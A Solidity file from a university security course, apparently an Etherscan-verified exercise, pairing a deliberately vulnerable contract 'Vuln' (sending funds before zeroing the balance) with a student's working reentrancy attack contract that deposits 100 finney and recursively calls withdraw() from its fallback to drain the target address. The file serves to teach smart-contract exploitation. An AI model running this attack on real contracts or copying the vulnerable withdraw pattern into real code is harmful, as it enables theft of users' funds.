/**
 *Submitted for verification at Etherscan.io on 2021-12-06
*/

pragma solidity ^0.5.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");
        //msg.sender is a contract i create 
        //msg.sender needs to deposit some amount of Ether and then recursivley call withdraw in its fallback function
        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attackContract{
    Vuln vv = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018)); 
    int256 count = 0;
    constructor() public{
        count = 0;
    }
    function attack() public payable{
         vv.deposit.value(100 finney)();
         vv.withdraw();
    }

    function() external payable {
        if(count < 3){
            vv.withdraw();
            count = count + 1;
        }
        //address attackContract = ""
        // call deposit and deposit .01 ether
        //call withdraw and force it to jump to the fallback function 
        //the fallback function will be another call of withdraw
    }


}